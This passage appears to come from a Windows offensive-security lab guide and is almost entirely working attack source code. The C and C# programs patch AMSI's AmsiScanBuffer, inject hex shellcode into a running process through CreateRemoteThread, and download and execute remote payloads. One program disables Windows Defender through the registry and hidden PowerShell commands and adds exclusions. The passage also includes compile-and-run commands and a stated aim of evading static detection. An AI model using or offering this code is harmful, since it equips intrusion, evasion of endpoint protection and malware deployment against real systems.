            printf("    - Windows Defender or EDR detected and blocked the bypass\n");
            printf("    - Memory protection prevented patching\n");
            printf("    - AMSI has additional protections in this environment\n");
            printf("    - Hardware breakpoint was cleared by security software\n");
        }

    } else {
        printf("[-] AMSI bypass initialization failed\n");
        return 1;
    }

    if (g_hwbp_ctx.thread_handle) {
        RemoveVectoredExceptionHandler(HardwareBypassHandler);
    }

    return 0;
}
```

### 2. Native Code with Indirect Syscalls

the c file gets flagged, but binary works(as a task try to evade detection from static code analysis)

```c
// amsi_native_bypass.c
// Compile: cl /O2 /GS- src\amsi_native_bypass.c /Fe:bin\amsi_bypass.exe ntdll.lib advapi32.lib

#include <windows.h>
#include <stdio.h>
#include <amsi.h>
#include <tlhelp32.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "amsi.lib")

// XOR key for obfuscation
#define XOR_KEY 0xAA

// NT API declarations
typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

// Find syscall instruction in ntdll
PVOID FindSyscallInstruction() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);

    // Find .text section
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sections[i].Name, ".text", 5) == 0) {
            BYTE* start = (BYTE*)ntdll + sections[i].VirtualAddress;
            DWORD size = sections[i].Misc.VirtualSize;

            // Search for syscall instruction (0x0F 0x05)
            for (DWORD j = 0; j < size - 1; j++) {
                if (start[j] == 0x0F && start[j + 1] == 0x05) {
                    printf("[+] Found syscall instruction at: 0x%p\n", &start[j]);
                    return &start[j];
                }
            }
        }
    }

    return NULL;
}

// Extract syscall number from function
DWORD GetSyscallNumber(PVOID function_address) {
    BYTE* func = (BYTE*)function_address;

    // Pattern: mov r10, rcx; mov eax, <syscall_number>
    // Bytes: 4C 8B D1 B8 XX XX XX XX
    for (int i = 0; i < 32; i++) {
        if (func[i] == 0xB8) {  // mov eax, imm32
            return *(DWORD*)&func[i + 1];
        }
    }

    return 0;
}

// Patch AMSI using NT API (more evasive than VirtualProtect)
BOOL PatchAmsiWithNtAPI() {
    printf("[*] Patching AMSI using NtProtectVirtualMemory...\n");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        printf("[-] Failed to get ntdll handle\n");
        return FALSE;
    }

    NtProtectVirtualMemory_t pNtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)GetProcAddress(ntdll, "NtProtectVirtualMemory");

    if (!pNtProtectVirtualMemory) {
        printf("[-] Failed to get NtProtectVirtualMemory\n");
        return FALSE;
    }

    DWORD ssn = GetSyscallNumber(pNtProtectVirtualMemory);
    if (ssn) {
        printf("[+] NtProtectVirtualMemory SSN: 0x%X\n", ssn);
    }

    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    PVOID amsi_scan_buffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan_buffer) {
        printf("[-] Failed to get AmsiScanBuffer\n");
        return FALSE;
    }

    printf("[+] AmsiScanBuffer at: 0x%p\n", amsi_scan_buffer);

    // Patch bytes: mov eax, 0x80070057 (E_INVALIDARG); ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    SIZE_T region_size = sizeof(patch);
    PVOID base_address = amsi_scan_buffer;
    ULONG old_protect = 0;

    // Use NtProtectVirtualMemory instead of VirtualProtect
    HANDLE current_process = (HANDLE)-1;
    NTSTATUS status = pNtProtectVirtualMemory(
        current_process,
        &base_address,
        &region_size,
        PAGE_EXECUTE_READWRITE,
        &old_protect
    );

    if (status != 0) {
        printf("[-] NtProtectVirtualMemory failed: 0x%X\n", status);
        return FALSE;
    }

    printf("[+] Memory protection changed to RWX\n");

    // Write patch
    memcpy(amsi_scan_buffer, patch, sizeof(patch));
    printf("[+] Patch written\n");

    // Restore protection
    status = pNtProtectVirtualMemory(
        current_process,
        &base_address,
        &region_size,
        old_protect,
        &old_protect
    );

    if (status == 0) {
        printf("[+] Memory protection restored\n");
    }

    return TRUE;
}


// Alternative: Patch via direct memory write (simpler)
BOOL PatchAmsiDirect() {
    printf("[*] Attempting direct AMSI patch...\n");

    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return FALSE;

    PVOID amsi_scan_buffer = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan_buffer) return FALSE;

    printf("[+] AmsiScanBuffer at: 0x%p\n", amsi_scan_buffer);

    DWORD old_protect;
    if (!VirtualProtect(amsi_scan_buffer, 16, PAGE_EXECUTE_READWRITE, &old_protect)) {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        return FALSE;
    }

    // Patch: mov eax, 0x80070057; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(amsi_scan_buffer, patch, sizeof(patch));

    VirtualProtect(amsi_scan_buffer, 16, old_protect, &old_protect);

    printf("[+] Direct patch applied\n");
    return TRUE;
}

// Test if AMSI is bypassed
BOOL TestAmsiBypass() {
    printf("\n[*] Testing AMSI bypass...\n");

    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    typedef HRESULT (WINAPI* AmsiInitialize_t)(LPCWSTR, HAMSICONTEXT*);
    typedef HRESULT (WINAPI* AmsiScanBuffer_t)(HAMSICONTEXT, PVOID, ULONG, LPCWSTR, HAMSISESSION, AMSI_RESULT*);
    typedef void (WINAPI* AmsiUninitialize_t)(HAMSICONTEXT);

    AmsiInitialize_t pAmsiInitialize = (AmsiInitialize_t)GetProcAddress(amsi, "AmsiInitialize");
    AmsiScanBuffer_t pAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(amsi, "AmsiScanBuffer");
    AmsiUninitialize_t pAmsiUninitialize = (AmsiUninitialize_t)GetProcAddress(amsi, "AmsiUninitialize");

    if (!pAmsiInitialize || !pAmsiScanBuffer) {
        printf("[-] Failed to get AMSI functions\n");
        return FALSE;
    }

    HAMSICONTEXT ctx = NULL;
    HRESULT hr = pAmsiInitialize(L"TestApp", &ctx);
    if (FAILED(hr)) {
        printf("[-] AmsiInitialize failed: 0x%X\n", hr);
        return FALSE;
    }

    // Test with AMSI test sample
    const char* test_sample = "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386";
    AMSI_RESULT result = AMSI_RESULT_CLEAN;

    hr = pAmsiScanBuffer(ctx, (PVOID)test_sample, (ULONG)strlen(test_sample),
                         L"TestSample", NULL, &result);

    printf("[*] AmsiScanBuffer returned: 0x%X\n", hr);
    printf("[*] Scan result: %d\n", result);

    if (hr == 0x80070057) {  // E_INVALIDARG
        printf("[+] BYPASS SUCCESSFUL - AMSI returned E_INVALIDARG\n");
        pAmsiUninitialize(ctx);
        return TRUE;
    } else if (result >= AMSI_RESULT_DETECTED) {
        printf("[-] BYPASS FAILED - AMSI detected malicious content\n");
        pAmsiUninitialize(ctx);
        return FALSE;
    } else {
        printf("[+] BYPASS SUCCESSFUL - Content not detected\n");
        pAmsiUninitialize(ctx);
        return TRUE;
    }
}

// Find process ID by name
DWORD FindProcessByName(const char* process_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create process snapshot\n");
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (_stricmp(pe32.szExeFile, process_name) == 0) {
            pid = pe32.th32ProcessID;
            printf("[+] Found %s with PID: %d\n", process_name, pid);
            break;
        }
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return pid;
}

// Convert hex string to bytes
unsigned char* HexToBytes(const char* hex_string, size_t* out_len) {
    size_t len = strlen(hex_string);
    if (len % 2 != 0) {
        printf("[-] Invalid hex string (odd length)\n");
        return NULL;
    }

    size_t byte_len = len / 2;
    unsigned char* bytes = (unsigned char*)malloc(byte_len);
    if (!bytes) {
        printf("[-] Memory allocation failed\n");
        return NULL;
    }

    for (size_t i = 0; i < byte_len; i++) {
        char byte_str[3] = { hex_string[i * 2], hex_string[i * 2 + 1], '\0' };
        bytes[i] = (unsigned char)strtol(byte_str, NULL, 16);
    }

    *out_len = byte_len;
    return bytes;
}

// Inject shellcode into target process
BOOL InjectPayload(DWORD pid, unsigned char* payload, size_t payload_size) {
    printf("\n[*] Injecting payload into PID %d...\n", pid);
    printf("[+] Payload size: %zu bytes\n", payload_size);

    // Open target process
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProc) {
        printf("[-] Failed to open process: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Process handle obtained\n");

    // Allocate memory in target
    PVOID remoteBuf = VirtualAllocEx(hProc, NULL, payload_size,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteBuf) {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Allocated memory at: 0x%p\n", remoteBuf);

    // Write payload
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, remoteBuf, payload, payload_size, &written)) {
        printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Wrote %zu bytes\n", written);

    // Execute via remote thread
    HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                       (LPTHREAD_START_ROUTINE)remoteBuf,
                                       NULL, 0, NULL);

    if (!hThread) {
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProc, remoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProc);
        return FALSE;
    }

    printf("[+] Remote thread created\n");
    printf("[+] Payload injected successfully!\n");

    WaitForSingleObject(hThread, 2000);

    CloseHandle(hThread);
    CloseHandle(hProc);

    return TRUE;
}

int main(int argc, char* argv[]) {
    // Check arguments
    if (argc < 3) {
        printf("Usage: %s <process_name> <shellcode_hex>\n", argv[0]);
        return 1;
    }

    const char* target_process = argv[1];
    const char* shellcode_hex = argv[2];

    // Convert hex shellcode to bytes
    size_t payload_size = 0;
    unsigned char* payload = HexToBytes(shellcode_hex, &payload_size);
    if (!payload) {
        printf("[-] Failed to parse shellcode\n");
        return 1;
    }

    printf("[+] Shellcode parsed: %zu bytes\n\n", payload_size);

    // Step 1: Bypass AMSI
    printf("[*] Step 1: Bypassing AMSI...\n");
    BOOL amsi_bypassed = PatchAmsiWithNtAPI();
    if (!amsi_bypassed) {
        printf("[*] Falling back to direct method...\n");
        amsi_bypassed = PatchAmsiDirect();
    }

    if (!amsi_bypassed) {
        printf("[-] AMSI bypass failed\n");
        free(payload);
        return 1;
    }

    // Verify AMSI bypass
    if (!TestAmsiBypass()) {
        printf("[-] AMSI bypass verification failed\n");
        free(payload);
        return 1;
    }

    printf("\n[+] AMSI successfully bypassed!\n");

    // Step 2: Find target process
    printf("\n[*] Step 2: Finding target process '%s'...\n", target_process);
    DWORD pid = FindProcessByName(target_process);

    if (pid == 0) {
        printf("[-] Process '%s' not found\n", target_process);
        printf("[*] Make sure the process is running\n");
        free(payload);
        return 1;
    }

    // Step 3: Inject payload
    printf("\n[*] Step 3: Injecting payload...\n");
    if (!InjectPayload(pid, payload, payload_size)) {
        printf("[-] Payload injection failed\n");
        free(payload);
        return 1;
    }

    printf("\n[+] All steps completed successfully!\n");
    free(payload);

    return 0;
}
```

**Compile and Run:**

```bash
# Compile
cl /O2 /GS- src\amsi_native_bypass.c /Fe:bin\amsi_bypass.exe ntdll.lib advapi32.lib

# Usage
.\bin\amsi_bypass.exe <process_name> <shellcode_hex>

.\bin\amsi_bypass.exe notepad.exe 505152535657556a605a6863616c6354594883ec2865488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd74883c4305d5f5e5b5a5958c3
```

### 3. Compiled C# Assemblies (Execute-Assembly)

```csharp
// ExecuteAssemblyPayload.cs
// Compile: csc /target:exe /out:payload.exe ExecuteAssemblyPayload.cs

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace AmsiBypass
{
    class ExecuteAssemblyPayload
    {
        // P/Invoke declarations for advanced operations
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {
            // Hide console window for stealth
            IntPtr handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            Console.WriteLine("[*] Execute-Assembly Payload - AMSI Bypass Demo");
            Console.WriteLine("[*] This code runs without AMSI scanning\n");

            if (args.Length > 0)
            {
                switch (args[0].ToLower())
                {
                    case "enum":
                        EnumerateSystem();
                        break;
                    case "download":
                        if (args.Length > 1)
                            DownloadAndExecute(args[1]);
                        else
                            Console.WriteLine("[-] Usage: payload.exe download <url>");
                        break;
                    case "exec":
                        if (args.Length > 1)
                            ExecuteCommand(string.Join(" ", args, 1, args.Length - 1));
                        else
                            Console.WriteLine("[-] Usage: payload.exe exec <command>");
                        break;
                    case "inject":
                        if (args.Length > 2)
                            InjectShellcode(args[1], args[2]);
                        else
                            Console.WriteLine("[-] Usage: payload.exe inject <pid> <shellcode_hex>");
                        break;
                    default:
                        ShowUsage();
                        break;
                }
            }
            else
            {
                ShowUsage();
            }

            // Show window again before exit
            ShowWindow(handle, SW_SHOW);
        }

        static void ShowUsage()
        {
            Console.WriteLine("Usage:");
            Console.WriteLine("  payload.exe enum              - Enumerate system information");
            Console.WriteLine("  payload.exe download <url>    - Download and execute payload");
            Console.WriteLine("  payload.exe exec <command>    - Execute command");
            Console.WriteLine("  payload.exe inject <pid> <sc> - Inject shellcode into process");
            Console.WriteLine("\nNote: This bypasses AMSI because it's compiled .NET code");
        }

        static void EnumerateSystem()
        {
            Console.WriteLine("[*] System Enumeration (AMSI-free)\n");

            // Computer info
            Console.WriteLine($"[+] Computer Name: {Environment.MachineName}");
            Console.WriteLine($"[+] User Name: {Environment.UserName}");
            Console.WriteLine($"[+] Domain: {Environment.UserDomainName}");
            Console.WriteLine($"[+] OS Version: {Environment.OSVersion}");
            Console.WriteLine($"[+] 64-bit OS: {Environment.Is64BitOperatingSystem}");
            Console.WriteLine($"[+] 64-bit Process: {Environment.Is64BitProcess}");
            Console.WriteLine($"[+] Processor Count: {Environment.ProcessorCount}");
            Console.WriteLine($"[+] CLR Version: {Environment.Version}");

            // Check privileges
            Console.WriteLine($"\n[*] Checking Privileges:");
            var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
            var principal = new System.Security.Principal.WindowsPrincipal(identity);
            bool isAdmin = principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            Console.WriteLine($"[+] Running as Administrator: {isAdmin}");
            Console.WriteLine($"[+] User SID: {identity.User}");

            // Network info
            Console.WriteLine($"\n[*] Network Information:");
            try
            {
                string hostName = Dns.GetHostName();
                IPHostEntry hostEntry = Dns.GetHostEntry(hostName);
                foreach (IPAddress ip in hostEntry.AddressList)
                {
                    if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                    {
                        Console.WriteLine($"[+] IP Address: {ip}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Network enum error: {ex.Message}");
            }

            // Running processes (high-value targets)
            Console.WriteLine($"\n[*] High-Value Processes:");
            string[] targetProcesses = { "lsass", "explorer", "winlogon", "services", "svchost" };
            foreach (var proc in Process.GetProcesses())
            {
                foreach (var target in targetProcesses)
                {
                    if (proc.ProcessName.ToLower().Contains(target))
                    {
                        try
                        {
                            Console.WriteLine($"[+] {proc.ProcessName} (PID: {proc.Id})");
                        }
                        catch { }
                    }
                }
            }

            // AV/EDR detection
            Console.WriteLine($"\n[*] Security Product Detection:");
            string[] securityProcesses = { "MsMpEng", "MsSense", "SenseCncProxy", "SenseIR",
                                          "CrowdStrike", "CsFalcon", "CSAgent", "elastic-agent",
                                          "elastic-endpoint", "SentinelAgent", "SentinelOne" };
            bool foundSecurity = false;
            foreach (var proc in Process.GetProcesses())
            {
                foreach (var secProc in securityProcesses)
                {
                    if (proc.ProcessName.ToLower().Contains(secProc.ToLower()))
                    {
                        Console.WriteLine($"[!] Detected: {proc.ProcessName}");
                        foundSecurity = true;
                    }
                }
            }
            if (!foundSecurity)
            {
                Console.WriteLine("[+] No common security products detected");
            }
        }

        static void ExecuteCommand(string command)
        {
            Console.WriteLine($"[*] Executing: {command}\n");

            try
            {
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = $"/c {command}",
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process process = Process.Start(psi))
                {
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();

                    if (!string.IsNullOrEmpty(output))
                    {
                        Console.WriteLine("[+] Output:");
                        Console.WriteLine(output);
                    }

                    if (!string.IsNullOrEmpty(error))
                    {
                        Console.WriteLine("[-] Error:");
                        Console.WriteLine(error);
                    }

                    Console.WriteLine($"\n[*] Exit Code: {process.ExitCode}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Execution failed: {ex.Message}");
            }
        }

        static void DownloadAndExecute(string url)
        {
            Console.WriteLine($"[*] Downloading from: {url}");

            try
            {
                using (WebClient client = new WebClient())
                {
                    // Add user agent to avoid basic detection
                    client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                    byte[] data = client.DownloadData(url);
                    Console.WriteLine($"[+] Downloaded {data.Length} bytes");

                    // Determine file type and execute appropriately
                    if (url.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                    {
                        string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".exe");
                        File.WriteAllBytes(tempPath, data);
                        Console.WriteLine($"[*] Saved to: {tempPath}");
                        Console.WriteLine("[*] Executing...");

                        Process.Start(tempPath);
                        Console.WriteLine("[+] Execution started");
                    }
                    else if (url.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("[*] Loading .NET assembly from memory...");
                        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(data);

                        // Try to find and invoke entry point
                        var entryPoint = assembly.EntryPoint;
                        if (entryPoint != null)
                        {
                            Console.WriteLine($"[+] Found entry point: {entryPoint.Name}");
                            entryPoint.Invoke(null, new object[] { new string[] { } });
                        }
                        else
                        {
                            Console.WriteLine("[-] No entry point found in assembly");
                        }
                    }
                    else
                    {
                        // Assume it's a script or text payload
                        string content = Encoding.UTF8.GetString(data);
                        Console.WriteLine("[+] Downloaded content:");
                        Console.WriteLine(content);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Download/Execute failed: {ex.Message}");
            }
        }

        static void InjectShellcode(string pidStr, string shellcodeHex)
        {
            Console.WriteLine("[*] Shellcode Injection (AMSI-free)");

            try
            {
                int pid = int.Parse(pidStr);
                byte[] shellcode = HexStringToByteArray(shellcodeHex);

                Console.WriteLine($"[*] Target PID: {pid}");
                Console.WriteLine($"[*] Shellcode size: {shellcode.Length} bytes");

                // P/Invoke for injection
                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
                if (hProcess == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to open process");
                    return;
                }

                IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length,
                                                 MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (allocMem == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to allocate memory");
                    CloseHandle(hProcess);
                    return;
                }

                Console.WriteLine($"[+] Allocated memory at: 0x{allocMem.ToInt64():X}");

                IntPtr bytesWritten;
                if (!WriteProcessMemory(hProcess, allocMem, shellcode, (uint)shellcode.Length, out bytesWritten))
                {
                    Console.WriteLine("[-] Failed to write shellcode");
                    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    return;
                }

                Console.WriteLine($"[+] Wrote {bytesWritten} bytes");

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to create remote thread");
                    VirtualFreeEx(hProcess, allocMem, 0, MEM_RELEASE);
                    CloseHandle(hProcess);
                    return;
                }

                Console.WriteLine("[+] Remote thread created successfully");
                Console.WriteLine("[+] Shellcode injection complete");

                CloseHandle(hThread);
                CloseHandle(hProcess);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Injection failed: {ex.Message}");
            }
        }

        static byte[] HexStringToByteArray(string hex)
        {
            hex = hex.Replace(" ", "").Replace("0x", "").Replace(",", "");
            byte[] bytes = new byte[hex.Length / 2];
            for (int i = 0; i < bytes.Length; i++)
            {
                bytes[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            }
            return bytes;
        }

        // P/Invoke declarations for injection
        [DllImport("kernel32.dll")]
        static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        const int PROCESS_ALL_ACCESS = 0x1F0FFF;
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint MEM_RELEASE = 0x8000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
    }
}
```

```c
// defender_stealth.c
// Compile: cl /O2 /GS- src\defender_stealth.c /Fe:bin\defender_stealth.exe advapi32.lib
// Requires Administrator privileges

#include <windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(lib, "advapi32.lib")

// XOR obfuscation for strings
void xor_decrypt(char* str, int len, char key) {
    for (int i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

// Obfuscated strings (XOR with 0x42)
char reg_path1[] = {0x34, 0x2f, 0x24, 0x36, 0x30, 0x21, 0x34, 0x27, 0x5c, 0x30, 0x29, 0x21, 0x2d, 0x33, 0x2b, 0x37, 0x2e, 0x36, 0x5c, 0x30, 0x29, 0x21, 0x2d, 0x33, 0x2b, 0x37, 0x2e, 0x36, 0x5c, 0x30, 0x29, 0x2d, 0x2d, 0x2b, 0x31, 0x37, 0x5c, 0x30, 0x29, 0x2e, 0x2c, 0x2b, 0x31, 0x37, 0x5c, 0x24, 0x27, 0x28, 0x27, 0x2e, 0x26, 0x27, 0x32, 0x5c, 0x34, 0x27, 0x21, 0x2c, 0x6e, 0x36, 0x29, 0x2d, 0x27, 0x5c, 0x30, 0x32, 0x2b, 0x36, 0x27, 0x21, 0x36, 0x29, 0x2b, 0x2e, 0x00};

// Check if running as administrator
BOOL IsElevated() {
    BOOL elevated = FALSE;
    HANDLE token = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            elevated = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }

    return elevated;
}

// Indirect PowerShell execution to avoid detection
BOOL ExecuteStealthCommand(const char* cmd) {
    // Create a batch file to execute the command
    char batch_path[MAX_PATH];
    GetTempPathA(MAX_PATH, batch_path);
    strcat_s(batch_path, MAX_PATH, "tmp.bat");

    FILE* f;
    if (fopen_s(&f, batch_path, "w") == 0) {
        fprintf(f, "@echo off\n");
        fprintf(f, "%s\n", cmd);
        fprintf(f, "del \"%%~f0\"\n");  // Self-delete
        fclose(f);

        // Execute batch file hidden
        STARTUPINFOA si = {sizeof(si)};
        PROCESS_INFORMATION pi;
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessA(NULL, batch_path, NULL, NULL, FALSE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            return TRUE;
        }
    }

    return FALSE;
}

// Disable via registry (obfuscated)
BOOL DisableViaRegistry() {
    printf("[*] Applying configuration changes...\n");

    HKEY hKey;
    DWORD value = 1;

    // Path 1: Real-Time Protection
    const char* paths[] = {
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection",
        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
        "SOFTWARE\\Microsoft\\Windows Defender\\Features"
    };

    const char* values1[] = {
        "DisableRealtimeMonitoring",
        "DisableBehaviorMonitoring",
        "DisableOnAccessProtection",
        "DisableScanOnRealtimeEnable"
    };

    const char* values2[] = {
        "DisableAntiSpyware",
        "DisableAntiVirus"
    };

    // Set Real-Time Protection keys
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, paths[0], 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        for (int i = 0; i < 4; i++) {
            RegSetValueExA(hKey, values1[i], 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        }
        RegCloseKey(hKey);
    }

    // Set Defender keys
    if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, paths[1], 0, NULL,
        REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

        for (int i = 0; i < 2; i++) {
            RegSetValueExA(hKey, values2[i], 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        }
        RegCloseKey(hKey);
    }

    printf("[+] Configuration applied\n");
    return TRUE;
}

// Disable via PowerShell (indirect)
BOOL DisableViaPowerShell() {
    printf("[*] Executing configuration commands...\n");

    // Build commands that are less suspicious
    const char* commands[] = {
        "powershell -w hidden -c \"Set-MpPreference -DisableRealtimeMonitoring 1\"",
        "powershell -w hidden -c \"Set-MpPreference -DisableBehaviorMonitoring 1\"",
        "powershell -w hidden -c \"Set-MpPreference -DisableIOAVProtection 1\"",
        "powershell -w hidden -c \"Set-MpPreference -DisableScriptScanning 1\"",
        "powershell -w hidden -c \"Set-MpPreference -MAPSReporting 0\"",
        "powershell -w hidden -c \"Set-MpPreference -SubmitSamplesConsent 2\"",
        "powershell -w hidden -c \"Add-MpPreference -ExclusionPath 'C:\\Windows_Mitigations_Lab'\"",
        "powershell -w hidden -c \"Add-MpPreference -ExclusionProcess 'payload.exe'\""
    };

    for (int i = 0; i < 8; i++) {
        ExecuteStealthCommand(commands[i]);
        Sleep(100);  // Small delay between commands
    }

    printf("[+] Commands executed\n");
    return TRUE;
}

int main(int argc, char* argv[]) {
    // Minimal output to avoid detection
    if (!IsElevated()) {
        printf("[-] Administrator privileges required\n");
        return 1;
    }

    printf("[*] Security Configuration Tool\n");
    printf("[*] Modifying system settings...\n\n");

    // Use both methods
    DisableViaRegistry();
    Sleep(500);
    DisableViaPowerShell();

    printf("\n[+] Configuration complete\n");
    printf("[*] Settings will take effect immediately\n");

    return 0;
}
```

**Compile and Use:**

```bash
# compile disable thingy
cl /O2 /GS- src\defender_stealth.c /Fe:bin\defender_stealth.exe advapi32.lib

# Compile the payload
csc /target:exe /out:payload.exe src\ExecuteAssemblyPayload.cs

# Usage examples
Get-Process notepad | Select-Object -ExpandProperty Id # find notepad id(open it first)
# try the next line with and without disabling defender, see what happens
# from an elevated terminal run .\bin\defender_stealth.exe
.\payload.exe inject 9348 505152535657556a605a6863616c6354594883ec2865488b32488b7618488b761048ad488b30488b7e3003573c8b5c17288b741f204801fe8b541f240fb72c178d5202ad813c0757696e4575ef8b741f1c4801fe8b34ae4801f799ffd74883c4305d5f5e5b5a5958c3 # inject shellcode
```

**Re-enable Defender (when done testing):**

```powershell
